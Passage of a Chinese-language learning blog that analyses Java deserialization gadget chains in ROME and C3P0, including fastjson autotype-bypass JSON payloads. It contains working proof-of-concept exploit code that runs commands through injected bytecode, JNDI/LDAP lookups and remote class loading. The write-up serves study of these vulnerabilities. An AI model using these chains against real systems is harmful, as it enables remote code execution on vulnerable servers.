pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);\n        ctClass.setSuperclass(superClass);\n        CtConstructor constructor = ctClass.makeClassInitializer();\n        constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;);\n        byte[] bytes = ctClass.toBytecode();\n\n        //反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制\n        TemplatesImpl templatesImpl = new TemplatesImpl();\n        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);\n        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;a&quot;);\n        setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);\n\n        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);\n        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(&quot;x&quot;));\n        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);\n\n\n        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();\n        hashMap.put(h1,h1);\n        hashMap.put(h2,h2);\n        ByteArrayOutputStream bs = unSerial(hashMap);\n    &#125;\n\n    private static ByteArrayOutputStream unSerial(Object o) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(o);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n\n&#125;\n3x01 流程分析入口点打在 readObject，然后跟进到 hashmap 的 readobject 方法然后持续跟进到 for 循环处，注意这里的第一次 key 的传值，是 slot_9，也就是我们 POC 中第一次put 的HotSwappableTargetSource然后跟进 putval，来到第二次 if 判断，这里要使 p 不等 null，才能走进 else 内容，触发 equals 方法但是当前 tab，也就是当前这个 hashmap 所有内容为空，所以不论我们现在 i 算出来多少作为键，tab 中取出的一定是 null，所以第一次进 putval 是无法触发后续链子的，这也是为什么我们 POC 要两次实例化不同的 HotSwappableTargetSource，后续就没有意义了，就是走进 if 判断成功的内容，然后将我们第一个HotSwappableTargetSource（带有XString 实体） 压入临时 tab那么继续第二次 putval 的跟进，此时 i 算出来的键值可以正好在临时 tab 缓存中取到我们刚才压入的 Hot，所以这里 p 取出不为 null，并且由于两次 putval 我们的作用对象都是 HotSwappableTargetSource 类型，两者的 hash 算出来一定是一样的，所以 if 前半段条件也会通过，后续 key 值就是我们第一次 putval 带有 toStringBean 的HotSwappableTargetSource 了，然后 k 值就是我们本次 putval 带有 XString 的 HotSwappableTargetSource所以这里就可以跟进 equals 方法了(分析到这里时我换了 spring5 版本的依赖，原因是 spring6 肯定不与 jdk8 兼容，升高 jdk 会导致一些类找不到，所以这里权衡之下选择降低 spring 的版本为 5，equals 方法有所区别了，但思路依旧)那么这里就开始调用 Xstring 的 equals 方法了，obj2 被构造为了 toStringBean后续就是 toStringBean 熟悉的流程了，不跟进了\n0x05 JdbcRowSetImpl利用链相信之前 fastjson 利用的时候应该很熟悉了，只不过利用点完全不同，fastjson 是利用的 set 方法，RMOE 中只会调用 get 方法，所以这里是调用其 get 方法触发的这个 get 方法是getDatabaseMetaData，他调用了 connect 方法了又是熟悉的调用InitialContext的 lookup 方法引起的 JNDI 注入标记lookup 里面的参数我们保证可控，跟进 getDataSourceName到了父类 BaseRowSet 的 getDataSourceName 方法， 他直接返回 dataSource 属性这里 dataSource 属性的设定依然还是要调用到 JdbcRowImpl 的setDataSourceName 方法，然后调用回 BaseRowSet 的setDataSourceName那参数可控的限制也解除，现在只需要考虑入口点怎么选了，其实前面的触发点都能够作为我们这里的入口点，JdbcRowImpl 的攻击手段在 ROME 反序列化中属于一个后续利用，也就是说我们可以不用去通过加载恶意类实现 RCE 了\n1x01 攻击实现先看 hashmap 的入口\njavaHashMap&lt;K,V&gt;.readObject(ObjectInputStream)\nHashMap&lt;K,V&gt;.hash(Object)\nObjectBean.hashCode()\nEqualsBean.hashCode()                  \nEqualsBean.beanHashCode()\nToStringBean.toString()\nToStringBean.toString(String)\nJdbcRowSetImpl.getDataSourceName选择 hashmap这里 JNDI 注入有很多选择，自己本地起一个 LDAP 或者 RMI 服务，或者用其他工具起也行，我这里用的 Yakit\njavaimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.rowset.JdbcRowSetImpl;\nimport com.sun.syndication.feed.impl.EqualsBean;\nimport com.sun.syndication.feed.impl.ObjectBean;\nimport com.sun.syndication.feed.impl.ToStringBean;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class JdbcRowSetImplPOC &#123;\n    public static void main(String[] args) throws Exception&#123;\n\n\n        JdbcRowSetImpl JRSI=new JdbcRowSetImpl();\n        JRSI.setDataSourceName(&quot;ldap://192.168.86.135:8078/BkooPVXv&quot;);\n        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,JRSI);\n        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);\n        Map hashMap = new HashMap();\n        hashMap.put(objectBean, &quot;x&quot;);\n        setFieldValue(objectBean, &quot;_cloneableBean&quot;, null);\n        setFieldValue(objectBean, &quot;_toStringBean&quot;, null);\n\n        ByteArrayOutputStream bs = unSerial(hashMap);\n        // 输出序列化的Base64编码字符\n        Base64Encode(bs);\n    &#125;\n    private static ByteArrayOutputStream unSerial(Map hashMap) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(hashMap);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n\n\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n&#125;\n0x06 EqualsBean链上文我们第一次分析 ObjectBean 链的时候就途径 EqualsBean， 其实 EqualsBean 本身就能够当作和 toStringBean 一类的最终触发点，这里只不过要想调用 get 方法需要通过其 beanEquals 方法\n1x01 流程分析equalsBean 的组件分析文章开头分析过了，这里就直接分析攻击链了\njavaHashSet.readObject\nHashMap.put\nHashMap.putval\nHashMap.equals\nAbastractMap.equals\nEqualsBean.equals\nEqualsBean.beanEquals\nTemplatesImpl.getOutputProperties()其实这里 HashSet 也算是一个新的入口点，对于EqualsBean 方向的攻击来说，只要能够触发到 equals 方法，我们都能接着往下走，所以前面还能换成\njavaHashTable.readObject(ObjectInputStream)\nHashTable.reconstitutionPut()\nHashMap.equals\nAbastractMap.equals\nEqualsBean.equals\nEqualsBean.beanEquals\nTemplatesImpl.getOutputProperties()hashtable 的 hash 碰撞就不讲了，但是 hashset 的处理方式要讲一下，跟 hashtable 的 hash 碰撞差不多，都是利用 yy zZ 两个字符串算出来的 hash 值相同\n2x01 hashSet 分析我们来到它的 readObject 方法相关的 for 循环这里 map 默认会被赋值为 hashmap，所以之后会调用 hashmap 的 put 方法熟悉的调用 putval，第一次进由于缓存 tab 里面没有值，所以第一次 if 判断 p 是否为空是一定满足不了的所以这里我们可能考虑要 hashset add 两次 equalsbean，不然第二次进入 putval 会报空错。想要调用到 equals 方法，if 判断条件中，第一个判断p.hash == hash也必须过，这里如果是直接 add 两个equalsbean 就不用管，算出来肯定一样（但是后续就要考虑和 hashtable 同样的 hash 碰撞了）第二次进入之后，顺利来到下面的这层判断，准备触发 equals\njavaif (p.hash == hash &amp;&amp;((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))如果我们刚才直接给 hashset add 进 equalsbean ，其中传入 equals 方法的参数 k 还是 equalsbean，这也不行，我们考虑其中加一层 hashmap 来包裹 equalsbean\nhashmap 的 equals 方法会调用到它的抽象类 Abstractmap 的 equals 方法，在它的 quals 方法中，他首先会通过 Iterator 迭代器，对我们当前 hashmap 作用，能够访问到当前 hashmap 的各个键值对。这里就是调用了 next 方法，取第二个键值对(假设此时键值对&lt;a,a&gt; &lt;b,b&gt;) &lt;b,b&gt;，然后取出它的 key 和 value，各为 b。然后这里调用 b 的 equals 方法，参数是 m 的键值 value，m 是什么？上面代码中制定了 m 是我们当前的 hashmap。key 是我们刚才取出的 b，也就是说，它会在两个 hashmap 中相互取值，这里比较绕，我们之后看 POC 能明白些\n2x02 攻击流程分析上述难关通关后，就可以正常调用链了，如果思路没错的话，我们直接看 POC，经测试，不论是 hashtable 还是 hashset 都能够这么用，各自的条件都已经注释好了\njavaimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.syndication.feed.impl.EqualsBean;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.*;\n\npublic class EqualsBeanPOC &#123;\n    public static void main(String[] args) throws Exception&#123;\n        ClassPool pool = ClassPool.getDefault();\n        CtClass ctClass = pool.makeClass(&quot;i&quot;);\n        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);\n        ctClass.setSuperclass(superClass);\n        CtConstructor constructor = ctClass.makeClassInitializer();\n        constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;);\n        byte[] bytes = ctClass.toBytecode();\n\n        TemplatesImpl templatesImpl = new TemplatesImpl();\n        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);\n        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;a&quot;);\n        setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);\n        EqualsBean bean = new EqualsBean(String.class, &quot;s&quot;);\n        //EqualsBean bean2 =new EqualsBean(String.class, &quot;s&quot;);\n\n\n        HashMap map1 = new HashMap();\n        HashMap map2 = new HashMap();\n        map1.put(&quot;yy&quot;, bean);\n        map1.put(&quot;zZ&quot;, templatesImpl);\n        map2.put(&quot;zZ&quot;, bean);\n        map2.put(&quot;yy&quot;, templatesImpl);\n        //Hashtable hashtable =new Hashtable();\n        HashSet hashSet=new HashSet();\n        hashSet.add(map1);\n        hashSet.add(map2);\n        //hashtable.put(map1,&quot;1&quot;);\n        //hashtable.put(map2,&quot;2&quot;);\n        setFieldValue(bean, &quot;_beanClass&quot;, Templates.class);\n        setFieldValue(bean, &quot;_obj&quot;, templatesImpl);\n        unSerial(hashSet);\n    &#125;\n\n    private static ByteArrayOutputStream unSerial(Object hashMap) throws Exception&#123;\n        ByteArrayOutputStream bs = new ByteArrayOutputStream();\n        ObjectOutputStream out = new ObjectOutputStream(bs);\n        out.writeObject(hashMap);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));\n        in.readObject();\n        in.close();\n        return bs;\n    &#125;\n    private static void Base64Encode(ByteArrayOutputStream bs)&#123;\n        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());\n        String s = new String(encode);\n        System.out.println(s);\n        System.out.println(s.length());\n    &#125;\n\n\n    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;\n        Field f = obj.getClass().getDeclaredField(field);\n        f.setAccessible(true);\n        f.set(obj, arg);\n    &#125;\n\n&#125;\n断点打在 readObject，跟进，然后顺利的来到 for 循环，第一次进 putval 肯定是不能够触发后续链的，但他会先给缓存 tab 赋值，把第一个 hashmap 存入进去我们直接跟进第二次 putval，此时两段 hash 算出来肯定是一样的，我们只需关注 key 值和 k 值即可，分别为我们本次循环 put 的 hashmap，以及第一次 put ，被存入 tab 缓存的 hashmap继续跟进 equals 方法m 值为我们传入的第一次的 hashmap，i 为关于第二个 hashmap 的迭代器，迭代器第一次初始化取到的键值对默认为空，所以它第一次 next 就是取出我们第二个 hashmap 的第一个键值对，也就是&lt;&quot;zZ&quot;,equalsbean&gt;，所以 key 是 zZ 字符串，value 是创建好的 qualsbean最终 value.equals(m.get(key)) 转化为EqualsBean.equals(templatesImpl)后续触发就是正常流程了，EqualsBean 的 equals 方法直接 return beanEquals 处理的结果，所以跟进beanEquals获取完 get 方法之后开始第一次调用，此时调用就是 TemplatesImpl 的 getOutputProperties 方法之后就是加载恶意字节码的流程，不过多赘述\n总结用 EqualsBean 的方式去触发链其实不只有 hashset 方法可以作为入口点，以及也不只 templatesImpl 作为最终恶意代码执行的点，它和 ToStringBean 一样，都只是作为攻击链其中的一部分。不过最重要的点还是它两作为 ROME 依赖中组件的特性，就是会调用目标类的 get 方法，这也是存在恶意代码执行的必要条件。我们学习 ROME 链的时候要和 CommonCollections 链联系起来，虽然 CC 是最开始我们学习 java 反序列化的先导，但其实两者是很像的。分析 ROME 链，我最大的感受可能是对 CC 链等依赖中存在的攻击链新的认识，其实就是分析 java 项目中存在哪些依赖，该依赖有没有漏洞点，能不能作为我最终攻击的跳板。\n","slug":"ROME反序列化","date":"2024-03-31T15:50:00.000Z","categories_index":"锻刀的理论学习-Rome反序列化","tags_index":"锻刀","author_index":"stoocea"},{"id":"f725b77aa2bec8f8665ea30f84226444","title":"C3P0攻击链学习","content":"什么是 C3P0？起手可以先把依赖点上\nxml&lt;dependencies&gt;\n&lt;dependency&gt;\n            &lt;groupId&gt;com.mchange&lt;/groupId&gt;\n            &lt;artifactId&gt;c3p0&lt;/artifactId&gt;\n            &lt;version&gt;0.9.5.2&lt;/version&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;在记录学习 Spring 和 mybatis 时曾经遇到过，那时候的记忆是关于 java 连接池管理的问题，也就是对数据库进行访问生成的各类线程的综合。而 C3P0 则是其中一个开源的 JDBC 连接池，目前默认使用 C3P0 连接池的有 hibernate  框架一般情况下，作为 java 中对于数据库连接的组件，它或多或少都带着序列化和反序列化的操作，或者常见带有 JNDI 服务\nGadget常见三处利用\n\nURLClassLoader 远程类加载\nJNDI 注入\n利用 HEX 序列化字节加载器进行反序列化\n\n0x01 URLClassLoader 远程类加载1x01 利用组件关系分析javaPoolBackedDataSourceBase#readObject -&gt;\n\nReferenceSerialized#getObject -&gt;\n\nReferenceableUtils#referenceToObject -&gt;\n\nObjectFactory#getObjectInstance我们先看PoolBackedDataSourceBase中的 readObject 触发点整体上来说是一个 switch 语句，但其实只有一种情况的判断—判断是否为 VERSION，然后对传入的序列化数据进行反序列化，然后调用被强转为IndirectlySerialized的反序列化的结果的 getObject 方法将this.connectionPoolDataSource赋值为  又被强转为ConnectionPoolDataSource的 o（反序列化对象）这里为什么要有两次强转？我们跟进到 ConnectionPoolDataSource 接口它本身并不继承于 serializable 接口，不能够被反序列化，而IndirectlySerialized算是ConnectionPoolDataSource的一个包装类，专门用来解决序列化和反序列化的需求那么具体是从哪里实现的呢？PoolBackedDataSourceBase在序列化 writeObject 的时候写明了调用com.mchange.v2.naming.ReferenceIndirector的 indirectForm 方法去包装connectionPoolDataSource类具体的indirectForm方法\njava    public IndirectlySerialized indirectForm( Object orig ) throws Exception\n    &#123; \n    Reference ref = ((Referenceable) orig).getReference();\n    return new ReferenceSerialized( ref, name, contextName, environmentProperties );\n    &#125;发现其实最终返回的是ReferenceSerialized类型的对象，而ReferenceSerialized实现了IndirectlySerialized接口，所以我们在执行PoolBackedDataSourceBase中的((IndirectlySerialized) o).getObject();代码的时候实际上是在执行ReferenceSerialized.getObject()再看看ReferenceIndirector 的结构，逻辑就很清晰了\n\n\n\n\n\n\n\n\n\nReferenceIndirector 执行 indirectForm 方法，用来将ConnectionPoolDataSource包装成 ReferenceSerialized，然后具体的调用 getObject\n这也是 gadget 链中如下部分的解释：\njavaPoolBackedDataSourceBase#readObject -&gt;\nReferenceSerialized#getObject -&gt;继续看getObject 方法的内容，有熟悉的 JNDI 注入的味道，但是找了一遍 contextName 赋值的地方，除了在 ReferenceIndirector 构造方法中默认设置 null， 没有其他地方找到可控传入的地方，这块 JNDI 利用其实就不太现实了那只能看 ReferenceableUtils.referenceToObject发现 referenceToObject 方法中如果我们传入了一个远程工厂类，他会对远程工厂类进行解析，然后对 URL 进行获取，通过 URLClassLoader 去进行类加载\n1x02 漏洞利用分析恶意类以及我们待会要调用到 ConnectionPoolDataSource，也就是其包装类 ReferenceSerialized 的 getObject 方法\njavapublic class exp &#123;\n    public exp() throws Exception&#123;\n        Runtime.getRuntime().exec(&quot;calc&quot;);\n    &#125;\n&#125;\njavaimport javax.naming.NamingException;\nimport javax.naming.Reference;\nimport javax.naming.Referenceable;\nimport javax.sql.ConnectionPoolDataSource;\nimport javax.sql.PooledConnection;\nimport java.io.PrintWriter;\nimport java.sql.Connection;\nimport java.sql.SQLException;\nimport java.sql.SQLFeatureNotSupportedException;\nimport java.util.logging.Logger;\n\npublic class CPDS implements ConnectionPoolDataSource , Referenceable &#123;\n\n    @Override\n    public Reference getReference() throws NamingException &#123;\n        return new Reference(&quot;ExpClass&quot;,&quot;exp&quot;,&quot;http://127.0.0.1:8888/&quot;);\n    &#125;\n    @Override\n    public PooledConnection getPooledConnection() throws SQLException &#123;\n        return null;\n    &#125;\n\n    @Override\n    public PooledConnection getPooledConnection(String user, String password) throws SQLException &#123;\n        return null;\n    &#125;\n\n    @Override\n    public PrintWriter getLogWriter() throws SQLException &#123;\n        return null;\n    &#125;\n\n    @Override\n    public void setLogWriter(PrintWriter out) throws SQLException &#123;\n\n    &#125;\n\n    @Override\n    public void setLoginTimeout(int seconds) throws SQLException &#123;\n\n    &#125;\n\n    @Override\n    public int getLoginTimeout() throws SQLException &#123;\n        return 0;\n    &#125;\n\n    @Override\n    public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;\n        return null;\n    &#125;\n\n\n&#125;\n然后是最终用来测试类的\njavaimport com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;\nimport java.io.*;\nimport java.lang.reflect.Field;\n\npublic class Test &#123;\n    public static void main(String[] args) throws Exception &#123;\n        PoolBackedDataSourceBase pbds=new PoolBackedDataSourceBase(false);\n        Class cls= pbds.getClass();\n        Field field=cls.getDeclaredField(&quot;connectionPoolDataSource&quot;);\n        field.setAccessible(true);\n        field.set(pbds,new CPDS());\n        serialize(pbds);\n        unserialize();\n    &#125;\n\n    public  static void serialize(PoolBackedDataSourceBase pbds) throws Exception&#123;\n        FileOutputStream fil=new FileOutputStream(new File(&quot;ser.bin&quot;));\n        ObjectOutputStream oos= new ObjectOutputStream(fil);\n        oos.writeObject(pbds);\n    &#125;\n\n\n    public static void unserialize()throws Exception &#123;\n        FileInputStream fis=new FileInputStream(new File(&quot;ser.bin&quot;));\n        ObjectInputStream objectInputStream=new ObjectInputStream(fis);\n        objectInputStream.readObject();\n    &#125;\n&#125;\n2x01 流程调试分析断点打在 unserialize 方法的 readObject 处跟进到 readObject 方法此时 readObject 方法中传入的数据流是 PoolBackedDataSourceBase 类 writeObject 方法写入的文件流数据–connectionPoolDataSource 被 ReferenceSerialized 包裹后的数据流而我们刚才创建的connectionPoolDataSource 类中 reference 对象中包含了我们的恶意类地址继续跟进 getObject然后跟进 referenceToObject 方法在获取到 ClassLoader 以及恶意类的 ClassLocation 和 ClassName 之后，调用 forName 方法进行动态类加载，然后对其实例化\n0x02 JNDI 注入JNDI 注入的这条链子依赖于 jackson 或者 fastjson 的反序列化前置才能进行利用链总结如下\njava#修改jndiName，用于最后的lookup(JndiName)-&gt;\n\nJndiRefConnectionPoolDataSource#setJndiName -&gt;\nJndiRefForwardingDataSource#setJndiName\n\n#JNDI调用\nJndiRefConnectionPoolDataSource#setLoginTime -&gt;\nWrapperConnectionPoolDataSource#setLoginTime -&gt;\nJndiRefForwardingDataSource#setLoginTimeout -&gt;\nJndiRefForwardingDataSource#inner -&gt;\nJndiRefForwardingDataSource#dereference() -&gt;\nContext#lookup1x01 利用链相关组件分析这里的漏洞开始触发点是由 FastJson 或者 jackson 的 set 方法调用触发的，本质上还是调用 JndiRefConnectionPoolDataSource 下的 setTime 方法，看看其具体内容\n2x01 初步设置参数—JndiRefConnectionPoolDataSource我们先看到最开始接触到的一个类 JndiRefConnectionPoolDataSource它的方法近乎全是 set 和 get 方法，我们可以认为，JndiRefConnectionPoolDataSource 类它在 C3P0 中对于 JNDI 功能的实现，是起到一个配置和读取的作用，真正的处理逻辑是不会在这的，一定会调用到其他的相关组件进行逻辑处理。更加形象的说，它主要起到一个入口柜台的作用，用来指引业务该往哪走，这也是为什么我们会选择它作为入口类的原因之一（maybe）那么这里我们可以直奔漏洞点入口 —setLoginTimeout 方法这里会指路到 wcpds 的 setLoginTimeout 方法，在初始化的就已经对 wcpds 变量进行了赋值，它是WrapperConnectionPoolDataSource 的简称，我们跟进到它具体的内容\n2x02 JNDI 功能扩展—WrapperConnectionPoolDataSource对于WrapperConnectionPoolDataSource 来说，他其实算是JndiRefConnectionPoolDataSource 的一个功能扩展类，算是一个二级中转站，也是还没有到具体的逻辑调用，直接跟进即可这里有两个方法的调用，我们先看 getNestedDataSource在我们没有设置任何参数的情况下它的默认设置是获取到 JndiRefForwardingDataSource 类\n2x03 具体功能—JndiRefForwardingDataSource刚才获取到之后直接跟进即可又是两层方法调用，这里我们先跟进到 inner 方法在 inner 方法中有一个 dereference 方法，其实在 JNDI 中 reference 就是指定对应工厂类的东西，这里调用 dereference 就是在获取指定的 datasource 了跟进，发现这里出现了经典的 jndi 注入漏洞的样式，initialContexct 的 lookup 方法这里 lookup 方法似乎可控，但是我们并没有在 JndiRefForwardingDataSource 找到具体的定义或者赋值的操作，回想我们最开始对于 JndiRefConnectionPoolDataSource 的描述，它是 JNDI 功能配置和获取的一个入口，我们能不能从它身上找到答案呢？答案是可以的，但是我们并不能确定此时设置的 JDNIName 能够传到JndiRefForwardingDataSource 中这里的 jrfds 是 JndiRefDataSourceBase 类，它是JndiRefForwardingDataSource 的父类，那一切都好说了，我们可以通过  JndiRefConnectionPoolDataSource 的 setJndiName 方法控制 JndiName，并且 lookup 入口也已确立，接下来就是初步的漏洞利用了\n1x02 C3P0-JNDI 利用开头讲过，要想利用 JNDI 这条链就必须通过 fastjson 或者 jackson 来进行触发，不仅仅只是因为它的触发点是 setLoginTimeout，我们还需要调用 setJndiName 去控制最后 lookup 的参数先把 fastjson 或者 jackson 的依赖打上这里我的 fastsjson 版本是 1.2.47 版本，所以打的 payload 需要通过 Class 类加载先把JndiRefConnectionPoolDataSource加载缓存 mapping 中绕过 checkautotype 的检测\nxml    &lt;dependency&gt;\n    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;\n    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;\n    &lt;version&gt;1.2.47&lt;/version&gt;\n  &lt;/dependency&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;commons-collections&lt;/groupId&gt;\n      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;\n      &lt;version&gt;3.2.1&lt;/version&gt;\n    &lt;/dependency&gt;先拿 fastjson 试试\njavapackage JNDI;\n\nimport com.alibaba.fastjson.JSON;\n\nimport javax.naming.InitialContext;\n\npublic class POC &#123;\n    public static void main(String[] args)  throws Exception&#123;\n            String payload=&quot;&#123;\\&quot;a\\&quot;:&quot; +\n                    &quot;&#123;\\&quot;@type\\&quot;: \\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;: \\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\\&quot;&#125;,&quot; +\n                    &quot;\\&quot;stoocea\\&quot;:&quot; +\n                    &quot;&#123;\\&quot;@type\\&quot;: \\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\\&quot;,&quot; +\n                    &quot;\\&quot;JndiName\\&quot;: \\&quot;ldap://127.0.0.1:10389/cn=TestLdap,dc=example,dc=com\\&quot;,&quot; +\n                    &quot;\\&quot;LoginTimeout\\&quot;: 0&#125;&quot; +\n                    &quot;&#125;&quot;;\n\n        JSON.parseObject(payload);\n    &#125;\n&#125;\n jackson 由于我环境问题尝试不出来，这里就不做演示了\n0x03 利用 HEX 序列化字节加载器进行反序列化攻击1x01 初步入口—WrapperConnectionPoolDataSourcejavaWrapperConnectionPoolDataSource()#init()#setUpPropertyListeners()\n//这个PropertyListener的作用在于，他会在我们对WrapperConnectionPoolDataSourceBase中属性进行赋值时，先行调用，然后\n\nWrapperConnectionPoolDataSource#setUserOverridesString()\nWrapperConnectionPoolDataSource#setUpPropertyListeners()\nC3P0ImplUtils#parseUserOverridesAsString()\nSerializableUtils#fromByteArray()#deserializeFromByteArray()\nreadObject()\n\n在我们刚才遇到的 WrapperConnectionPoolDataSource 中，其实他本身也隐藏了一道利用链，这条链的入口点在它的构造方法中前面的调用父类的构造方法属于WrapperConnectionPoolDataSource 的配置项，功能点较少，大多数为赋值和定义的操作setUpPropertyListeners 方法我们需要具体跟进他这里内容很奇怪，只进行了一次类的定义，不会进入其具体内容。我们通过它的名称多少能够猜出一点意思，listener 监听，和我们在 Tomcat 中的 listener 很想，也是在调用某一个属性或者方法时先行执行，再去执行后面的内容。这里的PropertyListeners 也是这个作用，当我们对 UserOverridesAsString 或者connectionTesterClassName 进行赋值操作时，会直接调到它的逻辑中，这为我们之后漏洞触发做了铺垫在 trycatch 块中调用了C3P0ImplUtils.parseUserOverridesAsString方法，用来获取 userOverrides，我们跟进其具体内容\n1x02 userOverridesString 的解析—C3P0ImplUtils它会首先判断我们的传入的 userString 是否为空，然后才会去走入具体的内容，否则就是直接 return 出去userString 是如何传入的？我们倒退回去看看–&gt;调用方法this.getUserOverridesAsString()来作为我们的 userString，但是这并不是它具体的定义内容，我们还是需要调用setUserOverridesAsString()方法来对其赋值可见其实这里我们还是需要 fastjson 或者 jackson 的支持才能保证先实例化WrapperConnectionPoolDataSource，调用完 set 方法再触发构造方法\njavaif (userOverridesAsString != null)\n        &#123;\n        String hexAscii = userOverridesAsString.substring(HASM_HEADER.length() + 1, userOverridesAsString.length() - 1);\n        byte[] serBytes = ByteUtils.fromHexAscii( hexAscii );\n        return Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );\n        &#125;这里假设我们满足 if (userOverridesAsString != null)的条件，进入其具体内容，它会首先对我们的 userString 进行一个 substring 的操作，这里截取的是从HASM_HEADER字符串过后的第一个字符，到倒数第二个字符的所有字符作为最终的返回结果，HASM_HEADER 字符串默认初始如下然后调用ByteUtils.fromHexAscii，从 16 进制字符转为 ascii 字符，存入 byte 数组作为字节码，然后调用fromByteArray( serBytes )调用到deserializeFromByteArray( bytes )跟进发现最终调用原生反序列化，那么这里就存在一个入口点整理一下思绪，其实现在最主要解决的问题是我们的 payload 怎么放？前面要放HASM_HEADER ，最后一个字符要被截取掉，所以在最后又必须填充一个字符串，中间存放我们的 16 进制字节码，以此来构造我们最终的 payload–userString这里我们可以选择直接在 java 中完成恶意类字节码的 16 进制转化，也可以用其他的脚本\n1x03 POC具体实现通过 readObject 去触发 CC6 这条链子即可poc\njavapackage HEXPOC;\n\nimport HEXPOC.CC6;\nimport com.alibaba.fastjson.JSON;\n\npublic class POC &#123;\n    public static void main(String[] args) throws Exception&#123;\n        String payload = &quot;&#123;&quot; +\n                &quot;\\&quot;a\\&quot;:&#123;&quot; +\n                &quot;\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,&quot; +\n                &quot;\\&quot;val\\&quot;:\\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;&quot; +\n                &quot;&#125;,&quot; +\n                &quot;\\&quot;b\\&quot;:&#123;&quot; +\n                &quot;\\&quot;@type\\&quot;:\\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;,&quot; +\n                &quot;\\&quot;userOverridesAsString\\&quot;:\\&quot;HexAsciiSerializedMap:&quot;+ new CC6().GetserializeHEXString() + &quot;;\\&quot;,&quot; +\n                &quot;&#125;&quot; +\n                &quot;&#125;&quot;;\n        JSON.parseObject(payload);\n\n    &#125;\n&#125;CC6 16进制序列化数据获得：是 CC6 生成加上序列化之后转成 byte 数组，再调用BigInteger 进行 16 进制转化\njavapackage HEXPOC;\n\nimport java.math.BigInteger;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 &#123;\n    public  String GetserializeHEXString() throws Exception &#123;\n        //======================runtime的加载\n        Transformer[] transformers=new Transformer[]&#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;,new 